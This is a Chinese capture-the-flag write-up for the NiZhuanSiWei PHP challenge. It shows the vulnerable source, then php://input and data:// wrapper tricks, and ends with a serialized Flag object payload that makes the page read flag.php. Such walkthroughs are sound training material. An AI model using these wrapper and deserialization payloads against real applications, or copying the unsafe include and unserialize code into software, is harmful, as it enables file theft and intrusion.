@[toc](文章目录)

##  NiZhuanSiWei

打开环境，看到代码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

进行代码审计，发现需要绕过三个点，text，file和password

首先text：看到file_get_contents(),打开文件内容，就需要写入文件内容，但是没办法写入，我就想到了伪协议的php://input,post的内容就是文件内容

所以：text=php://input,post内容是welcome to the zjctf

然后看file，我们看到useless.php,多半是要打开它，所以使用filter协议来读取文件内容

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}
?>
```

我们就需要useless.php的代码来反序列化

反序列化简单

```
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}
$a=new Flag();
echo serialize($a);
?>
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  
```

最后的payload

```php
text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
如果用input，需要POST传参，如果用data代替input，可以GET传参
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

##  



